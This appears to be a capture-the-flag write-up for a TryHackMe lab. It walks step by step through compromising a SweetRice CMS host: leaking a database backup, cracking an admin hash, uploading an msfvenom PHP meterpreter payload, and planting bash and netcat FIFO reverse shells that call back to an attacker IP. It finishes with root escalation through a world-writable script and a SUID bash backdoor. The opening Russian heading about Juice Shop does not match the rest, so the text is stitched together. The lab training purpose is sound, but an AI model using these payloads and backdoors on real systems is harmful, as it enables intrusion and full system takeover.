<b>PENETRATION TEST JUICE-SHOP</b>

<i>Этап 1.Reconnaissance (Разведка)</i>

в процессе разведки необходимо собрать <b>тех.стек</b> веб-приложения и <b>ENTRY-POINT</b>
первый инструмент,который я использую NMAP, с помощью которого просканируем порты,узнаем версии служб и какие сервисы работают на портах.

<img width="696" height="839" alt="Снимок экрана 2026-06-27 181425" src="https://github.com/user-attachments/assets/d06ddfd3-d2ec-4a99-8046-926e15a9c957" />

<img width="693" height="907" alt="Снимок экрана 2026-06-27 181439" src="https://github.com/user-attachments/assets/e651b157-d78f-4de8-b5cb-ad2a5b459a78" />


🚩 JUICE-SHOP 

> [!NOTE]
> **Machine Description**
> LazyAdmin is an "Easy" difficulty Linux machine. The exploitation path focuses on exploiting a misconfigured CMS (SweetRice), uncovering sensitive backup files, and performing Privilege Escalation based on a script with excessive permissions.

## 🎯 Target Information
- **IP Address:** `10.112.138.191`
- **Platform:** [TryHackMe - LazyAdmin](https://tryhackme.com/room/lazyadmin)
- **Compromise Date:** March 30, 2026

---

## 🔍 Enumeration

The enumeration phase is critical for identifying the machine's attack surface. I started with a full port scan to discover active services and potential entry points.

### 🛰️ Network Reconnaissance (RustScan)
To maximize efficiency, I utilized **RustScan** to rapidly identify open ports, then piped the results into **Nmap** for detailed version detection and default script analysis.

> [!IMPORTANT]
> Execution: Port Scanning
> ```bash title:"RustScan Discovery"
> rustscan -a 10.112.138.191 \
>   --range 1-65535 \
>   --ulimit 5000 \
>   -- -sV -sC -Pn
> ```

> [!NOTE]
> **Port Scan Results**
>
> | Port | Status | Service | Version |
> | :--- | :--- | :--- | :--- |
> | **22** | Open | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
> | **80** | Open | HTTP | Apache httpd 2.4.18 (Ubuntu) |
#### Service Analysis:

- **Port 22 (SSH):** Running a standard OpenSSH version on Ubuntu. No immediate RCE vulnerabilities are known for this version, suggesting we will likely need credentials to proceed.
    
- **Port 80 (HTTP):** Nmap reports the title Apache2 Ubuntu Default Page. This confirms that the web server's root directory (/) does not host the main application, which is likely hidden in a subdirectory.
### Web Exploration

#### Root Page Analysis
After identifying an open HTTP service on port 80, I navigated to the target's root IP address. The server displays the standard **Apache2 Ubuntu Default Page**, which confirms the web server is running but does not host any custom content at the root level.

![apache_default_page](./imgs/apache_default_page.png)


> [!NOTE]
> Methodology
> Since the root directory (`/`) does not contain any application-specific content, I proceeded with directory brute-forcing to identify hidden paths and potential web applications.

### 📂 Directory Enumeration (Feroxbuster)
To perform a deeper discovery, I utilized **Feroxbuster**. Its recursive capabilities are ideal for uncovering nested structures in the web server.

> [!IMPORTANT]
> Execution: Feroxbuster Discovery
> ```bash title:"Feroxbuster Scan"
> feroxbuster -u http://10.112.138.191 \
>   -w /usr/share/seclists/Discovery/Web-Content/common.txt
> ```

The scan revealed several interesting directories, most notably under the `/content/` path:

> [!TIP]
> **Notable Findings & Attack Surface**
>
> | Path | Status | Analysis |
> | :--- | :--- | :--- |
> | `/content/` | 301 | Main application directory (SweetRice CMS). |
> | `/content/as/` | 301 | Administrative Login Panel. Our primary target for credential exploitation. |
> | `/content/inc/` | 301 | System includes directory with directory listing enabled. |
> | `/content/inc/mysql_backup/` | 200 | **High Value:** Contains a SQL database backup file. |
> | `/content/_themes/` | 301 | Themes directory. Potential target for RCE via theme modification. |

#### Analysis:
The enumeration results clearly indicate multiple vectors. The most immediate path to exploitation is the **Information Disclosure** in the `/inc/mysql_backup/` directory. By analyzing the SQL backup, we can attempt to extract administrative credentials to gain access to the `/as/` login portal.

### 🖼️ Manual Exploration

After the automated scan, I manually verified the most interesting paths to confirm the application type and identify potential entry points.

#### 1. SweetRice CMS Homepage (/content/)

Navigating to /content/ confirms the site is running **SweetRice CMS**. This gives us a specific target for known vulnerabilities and exploit research.

![sweetrice_home](./imgs/sweetrice_home.png)

#### 2. Administrative Login (/content/as/)

The administrative portal was located at /content/as/. This will be our primary target once we obtain valid credentials.

![admin_login](./imgs/admin_login.png)

#### 3. Information Disclosure (/content/inc/)

Navigating to the /content/inc/ directory confirms that **Directory Listing** is enabled. This allows us to see the backend structure of the CMS, exposing several sensitive files and directories.

![directory_listing_inc](./imgs/directory_listing_inc.png)

> [!WARNING]
> Key Finding: Database Backup  
> Inside /content/inc/mysql_backup/, a publicly accessible SQL backup file was discovered: mysql_bakup_20191129023059-1.5.1.sql. This file likely contains sensitive administrative data and credentials.

#### 4. Theme Structure (/content/\_themes/default/)

The directory /content/\_themes/default/ also allows directory listing, revealing the template files used by the CMS (e.g., header.php, footer.php, main.php).

![directory_listing_themes](./imgs/directory_listing_themes.png)

> [!TIP]
> **Potential RCE Vector**
> In many CMS platforms like SweetRice, theme files can be edited from the administrative dashboard. This provides a clear path to **Remote Code Execution (RCE)** by injecting a PHP Reverse Shell into one of these template files once authenticated.


## 🔓 Initial Access

### Credential Extraction (Database Backup)
Having discovered an exposed database backup, the next step is to download the file locally and analyze it for sensitive information, such as user credentials.

> [!IMPORTANT]
> Execution: Downloading the Backup
> ```bash title:"Wget Execution"
> wget http://10.112.138.191/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
> ```

Upon inspecting the file using `cat`, I noticed it is structured as a PHP array containing SQL statements. While most of the file creates database structures, **line 14** contains an `INSERT` statement for the `options` table. 

This table stores global configuration settings as a **serialized PHP array**, which includes the administrator's credentials in plain text and a hashed password format.

> [!IMPORTANT]
> Execution: Analyzing the Backup (Truncated)
> ```sql title:"mysql_bakup_20191129023059-1.5.1.sql"
>   12 => 'DROP TABLE IF EXISTS `%--%_options`;',
>   13 => 'CREATE TABLE `%--%_options` ( ... );',
>   14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'... admin\";s:7:\"manager\";s:6:\"passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb\"; ...\');'
> ```

#### Analysis of the Serialized Data:
By breaking down the serialized string in line 14, we can clearly read the authentication parameters:
- `s:5:"admin";s:7:"manager"` translates to the **Username**: `manager`
- `s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb"` translates to a 32-character **Password Hash**.

> [!CAUTION]
> Loot: Administrator Credentials
> **Username:** `manager`
> **Hash (MD5):** `42f749ade7f9e195bf475f37a44cafcb`

#### Password Cracking
With the administrator's hash extracted, the next step was to recover the plaintext password. I utilized **John the Ripper** along with the **rockyou.txt** wordlist to perform a dictionary attack.

First, I saved the hash into a local file:
> [!IMPORTANT]
> Preparation: Saving the Hash
> ```bash title:"Hash Preparation"
> echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
> ```

Then, I executed the cracking process specifying the `raw-MD5` format:
> [!IMPORTANT]
> Execution: John the Ripper
> ```bash title:"John the Ripper Cracking"
> john --format=raw-MD5 \
>   --wordlist=/usr/share/wordlists/rockyou.txt \
>   hash.txt
> ```

> [!TIP]
> **Password Cracked**
>
> | Username | Hash | Plaintext Password |
> | :--- | :--- | :--- |
> | manager | 42f749ade7f9e195bf475f37a44cafcb | **Password123** |

#### Analysis:
The password was successfully cracked using a dictionary attack. With the credentials (**manager:Password123**), we can now proceed to authenticate against the administrative dashboard.
### 🖥️ Dashboard Authentication
With valid credentials in hand, I navigated back to the administrative login panel discovered during the web enumeration phase (`http://10.112.138.191/content/as/`).

By entering the username `manager` and the cracked password `Password123`, I successfully authenticated and gained access to the CMS backend.

![sweetrice_dashboard](./imgs/sweetrice_dashboard.png)

> [!NOTE]
> Dashboard Analysis
> The dashboard confirms we have full administrative privileges. Exploring the left-hand menu reveals various management options such as *Ads*, *Media Center*, and *Theme*. 
> 
> More importantly, looking at the top-left corner of the interface, the exact CMS version is disclosed: **SweetRice Current version : 1.5.1**. This specific version number provides the exact target needed to research known public vulnerabilities.

## 🚀 Vulnerability Research & Exploitation

### 🔎 Vulnerability Discovery (Searchsploit)
After identifying the CMS as **SweetRice 1.5.1**, I queried the local Exploit Database using `searchsploit` to find known vulnerabilities for this specific version.

> [!IMPORTANT]
> Execution: Exploit Search
> ```bash title:"Searchsploit Results"
> searchsploit sweetrice 1.5.1
> ```

> [!NOTE]
> Initial Analysis
> The search yielded several critical results:
> - **Backup Disclosure (40718.txt):** Confirms the vulnerability we already exploited to obtain the database backup.
> - **Arbitrary File Upload (40716.py):** Suggests Remote Code Execution (RCE) via unrestricted file uploads.
> - **CSRF / PHP Code Execution (40700.html):** Suggests a method to execute arbitrary PHP code.

Instead of running these exploits blindly, I reviewed their source code to understand the underlying mechanics. Since we already have administrative access, we can bypass the CSRF or automated login components and interact directly with the vulnerable endpoints via the GUI.

---

### 🧠 Exploit Analysis & Attack Vector Selection

By examining the code of the most promising exploits, I identified two distinct paths to achieve **RCE** through the administrative dashboard:

#### Vector 1: Arbitrary File Upload (`40716.py`)
Reading the Python script revealed how it interacts with the web application's Media Center:

> [!NOTE]
> Code Snippet: 40716.py
> ```python title:"Extract from Arbitrary File Upload Exploit"
> uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
> # ...
> print("[+] URL : http://" + host + "/attachment/" + filename)
> ```

> [!CAUTION]
> The Flaw
> The script targets the `media_center` endpoint, demonstrating that the CMS lacks proper validation for uploaded file extensions. A malicious `.php` script can be uploaded directly into the `/attachment/` directory and executed by navigating to it.

#### Vector 2: PHP Code Execution (`40700.html`)
The HTML exploit, designed as a Cross-Site Request Forgery (CSRF) attack, exposes a dangerous built-in "feature" of the CMS:

> [!NOTE]
> Code Snippet: 40700.html
> ```html title:"Extract from CSRF Exploit"
> <form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
> <input type="hidden" name="adk" value="hacked"/>
> <textarea type="hidden" name="adv">
> <?php echo '<h1> Hacked </h1>'; phpinfo(); ?>
> </textarea>
> </form>
> <!-- Note in exploit: Access Page In http://localhost/sweetrice/inc/ads/hacked.php -->
> ```

> [!CAUTION] 
> he Flaw
> The exploit targets the `type=ad` endpoint. It shows that the **Ads Manager** allows administrators to input raw PHP code, which the CMS then saves as an executable `.php` file in the `/inc/ads/` directory.

## 🐚 Initial Access: Remote Code Execution (RCE)

To demonstrate the full extent of the vulnerabilities in **SweetRice 1.5.1**, I executed two different exploitation techniques to achieve a reverse shell.

---

### 🛡️ Vector 1: Arbitrary File Upload (Media Center)
The first method exploits a weakness in the **Media Center** upload functionality. While the application attempts to block direct `.php` uploads, it fails to account for alternative PHP extensions.

#### 1. Payload Generation (msfvenom)
I generated a PHP Meterpreter reverse shell using `msfvenom`. To bypass the basic extension filtering, I saved the file with a **`.phtml`** extension, which is often executed by Apache as PHP code but frequently overlooked by blacklists.

> [!IMPORTANT]
> Execution: Generating the Payload
> ```bash title:"msfvenom"
> msfvenom -p php/meterpreter/reverse_tcp \
>   LHOST=192.168.183.48 \
>   LPORT=4444 \
>   -f raw > shell.phtml
> ```

#### 2. Handler Setup (Metasploit)
On my attacker machine, I configured a Metasploit listener to catch the incoming connection.

> [!IMPORTANT]
> Execution: Metasploit Listener
> ```bash title:"msfconsole"
> use exploit/multi/handler
> set payload php/meterpreter/reverse_tcp
> set LHOST 192.168.183.48
> set LPORT 4444
> exploit
> ```

#### 3. Upload and Trigger
I uploaded the `shell.phtml` file via the **Media Center** dashboard. Once uploaded, the file was stored in the `/content/attachment/` directory.

![media_center](./imgs/media_center.png)

I then triggered the execution using `curl`.

> [!IMPORTANT]
> Execution: Triggering the Shell
> ```bash title:"Curl Trigger"
> curl http://10.112.138.191/content/attachment/shell.phtml
> ```

> [!TIP]
> Meterpreter Session Opened
> The bypass was successful. Apache executed the `.phtml` file, and a Meterpreter session was established, granting initial access to the target system.

---

### 🛡️ Vector 2: Ads Manager Abuse (Direct PHP Injection)
The second exploitation method involves abusing the **Ads Management** feature of SweetRice. This is a "living off the land" approach within the CMS, as it utilizes built-in functionality to write and execute code on the server.

#### 1. Payload Creation
Instead of a pre-generated binary, I utilized a manual **PHP Reverse Shell** payload designed to call back to my attacker machine using a bash command.

> [!NOTE]
> Reverse Shell Payload
> ```php
> <?php
> exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.183.48/5555 0>&1'");
> ?>
> ```

#### 2. Injection via Dashboard
1. Navigate to **Ads** -> **Add Ad**.
2. **Ad Name:** `shell` (The CMS will automatically save this as `shell.php`).
3. **Ad Content:** Injected the PHP code snippet above.
4. **Action:** Clicked **Done** to write the file to the disk.

![ads](./imgs/ads.png)

Based on our previous exploit analysis, I know the CMS stores these files in the `/content/inc/ads/` directory.

---

## 🏹 Gaining Access: Reverse Shell

With the payload successfully injected, I prepared my attacker machine to catch the incoming connection.

> [!IMPORTANT]
> Step 1: Setting up the Netcat Listener
> ```bash title:"Attacker Terminal"
> nc -lvnp 5555
> ```

> [!IMPORTANT]
> Step 2: Triggering the Execution
> I triggered the shell by navigating to the newly created file via `curl`:
> ```bash title:"Trigger Command"
> curl http://10.112.138.191/content/inc/ads/shell.php
> ```

> [!TIP]
> Connection Established
> A reverse shell was successfully received on my Netcat listener, providing initial command-line access as the `www-data` user.

![nc_connection](./imgs/nc_connection.png)
## 🛠️ Shell Stabilization (TTY Upgrade)

The initial shell obtained via Netcat is "dumb" (non-interactive, no tab completion, no arrow keys). To perform effective post-exploitation, I upgraded it to a fully interactive **TTY shell**.

#### 1. Python PTY Spawn
First, I used Python to spawn a pseudo-terminal:
> [!IMPORTANT]
> Execution: Python Upgrade
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> ```

#### 2. STTY Raw Mode
To enable keyboard shortcuts (like Ctrl+C) and tab completion, I performed a TTY upgrade:
1. Press `Ctrl + Z` to background the shell.
2. Execute the following on the attacker machine:

> [!IMPORTANT]
> Execution: Terminal Configuration
> ```bash
> stty raw -echo; fg
> ```
3. Press **Enter** twice to return to the stabilized shell.

#### 3. Environment Setup
Finally, I set the terminal environment to support standard tools like `nano` or `clear`:

> [!IMPORTANT]
> Execution: Exporting Term
> ```bash
> export TERM=xterm
> ```

## 🏁 Post-Exploitation & User Flag

After stabilizing the shell as the `www-data` user, I explored the system to locate the user flag and identify potential paths for privilege escalation.

### 👤 User Flag
Navigating to the home directory of the user `itguy`, I found several interesting files, including the user flag.

> [!IMPORTANT]
> Execution: Retrieving User Flag
> ```bash title:"Terminal: /home/itguy"
> www-data@THM-Chal:/home/itguy$ ls -l
> total 56
> -rw-r--r-x 1 root root     47 Nov 29  2019 backup.pl
> -rw-rw-r-- 1 itguy itguy   16 Nov 29  2019 mysql_login.txt
> -rw-rw-r-- 1 itguy itguy   38 Nov 29  2019 user.txt
> ...
> www-data@THM-Chal:/home/itguy$ cat user.txt
> ```

> [!TIP]
> **User Flag**
> `THM{63e5bce927195******************}``

---

## 🚀 Privilege Escalation

With initial access secured, the next objective is to escalate privileges to the `root` user. I started by checking the current user's sudo permissions.

### 🔍 Sudo Privileges Enumeration
I executed `sudo -l` to see if the `www-data` user has any special permissions.

> [!IMPORTANT]
> Execution: sudo -l
> ```bash title:"Sudo Permissions"
> www-data@THM-Chal:/home/itguy$ sudo -l
> Matching Defaults entries for www-data on THM-Chal:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
> 
> User www-data may run the following commands on THM-Chal:
>     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
> ```

#### Analysis:
The output of `sudo -l` reveals a critical misconfiguration:
- The user `www-data` can execute `/usr/bin/perl /home/itguy/backup.pl` as **root** (ALL) without providing a password (`NOPASSWD`).

This is our primary vector for privilege escalation. If we can manipulate the behavior of `backup.pl` or any script it calls, we can execute commands with root privileges.

### 🛠️ Privilege Escalation: World-Writable Script
Following the `sudo -l` output, I analyzed the `/home/itguy/backup.pl` script to understand how it operates.

> [!IMPORTANT]
> Execution: Analyzing backup.pl
> ```perl title:"backup.pl Source"
> #!/usr/bin/perl
> system("sh", "/etc/copy.sh");
> ```

The Perl script simply executes a shell script located at `/etc/copy.sh`. I then checked the permissions of this target file:

> [!IMPORTANT]
> Execution: Checking File Permissions
> ```bash title:"ls -l /etc/copy.sh"
> www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh
> -rw-r--rwx 1 root root 51 Mar 30 23:34 /etc/copy.sh
> ```

> [!CAUTION]
> Vulnerability: Improper Permissions
> The file `/etc/copy.sh` is **world-writable** (`rwx` for others). This allows any user on the system to modify its content. Since the script is executed by `backup.pl` via `sudo`, any code we place inside `/etc/copy.sh` will run with **root privileges**.

### 🎯 Exploitation & Troubleshooting
Since the Perl script executes `/etc/copy.sh` with root privileges, I attempted to overwrite it with a reverse shell payload.

#### Initial Attempt: Bash Redirection (Failed)
I first tried a standard bash reverse shell. However, the execution failed with a specific syntax error.


> [!IMPORTANT]
> Execution: Failed Payload
> ```bash title:"Terminal: Bash Redirection Attempt"
> www-data@THM-Chal:/home/itguy$ echo "bash -i >& /dev/tcp/192.168.183.48/5555 0>&1" > /etc/copy.sh
> www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
> /etc/copy.sh: 2: /etc/copy.sh: Syntax error: Bad fd number
> ```

> [!WARNING]
> Root Cause: Shell Compatibility (Dash vs. Bash)
> The "Bad fd number" error occurs because the Perl script uses `system("sh", "/etc/copy.sh")`. On Ubuntu, `/bin/sh` is a symbolic link to **Dash**, which does not support the `/dev/tcp/` redirection syntax (a "bashism"). To achieve a stable shell, I switched to a more universal Netcat FIFO payload.

#### Final Attempt: Netcat FIFO Shell (Successful)
I utilized a Netcat FIFO (Named Pipe) payload to bypass the shell compatibility issue.

1. **Attacker Machine:** I started a new listener on port 6666.

```bash title:"Attacker: Netcat Listener"
nc -lvnp 6666
```

2. **Target Machine:** I injected the robust payload and executed the Perl script with sudo.

> [!IMPORTANT]
> Execution: Root Exploitation
> ```bash title:"Terminal: Injecting & Executing"
> # Overwriting the script with a Netcat FIFO payload
> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.183.48 6666 >/tmp/f" > /etc/copy.sh
> 
> # Executing the sudo command
> sudo /usr/bin/perl /home/itguy/backup.pl
> ```

---

## 👑 Root Access

The listener successfully caught the connection, granting a shell with full root privileges.

> [!TIP]
> Root Shell Obtained
> ```bash title:"Root Terminal"
> # whoami
> root
> # cd /root
> # cat root.txt
> ```

> [!TIP]
> **Root Flag**
> `THM{6637f41d0177b******************}`

### 🛠️ Alternative Method: SUID Bash Backdoor
Instead of a reverse shell, we can achieve privilege escalation by creating a **SUID (Set User ID)** copy of the bash binary. This effectively creates a persistent backdoor to root.

#### 1. Payload Logic
The goal is to copy the `/bin/bash` binary to a writable directory (`/tmp`) and assign it SUID permissions. When a file has SUID set, it executes with the privileges of the file owner (in this case, **root**).

> [!IMPORTANT]
> Execution: Creating the Backdoor
> ```bash title:"Terminal: Injecting SUID Payload"
> # Overwriting the script with the SUID command
> echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /etc/copy.sh
> 
> # Executing the sudo command to trigger the creation
> sudo /usr/bin/perl /home/itguy/backup.pl
> ```

#### 2. Taking Control
Once the command is executed, a new binary named `rootbash` appears in `/tmp`. To use it correctly, we must use the `-p` (persistence) flag.

> [!NOTE]
> Why the -p flag?
> Modern versions of Bash drop root privileges by default when they detect that the Effective User ID (EUID) does not match the Real User ID (RUID). The `-p` flag prevents this behavior, allowing us to keep the root shell.

> [!IMPORTANT]
> Execution: Spawning Root Shell
> ```bash title:"Terminal: Escalating to Root"
> www-data@THM-Chal:/home/itguy$ /tmp/rootbash -p
> rootbash-4.3# whoami
> root
> ```

> [!TIP]
> Root Access Granted
> We are now root and can proceed to read the final flag in `/root/root.txt`.
---

## 🏁 Conclusion

The exploitation of **LazyAdmin** followed a classic penetration testing lifecycle:

1. **Enumeration:** Discovery of an exposed database backup via directory listing misconfiguration.
    
2. **Credential Theft:** Extracting and cracking a weak MD5 hash from the SQL backup.
    
3. **Initial Access:** Achieving Remote Code Execution (RCE) by abusing the "Ads" feature in SweetRice CMS.
    
4. **Privilege Escalation:** Identifying and exploiting a world-writable script executed with sudo permissions, while troubleshooting shell-specific syntax issues.
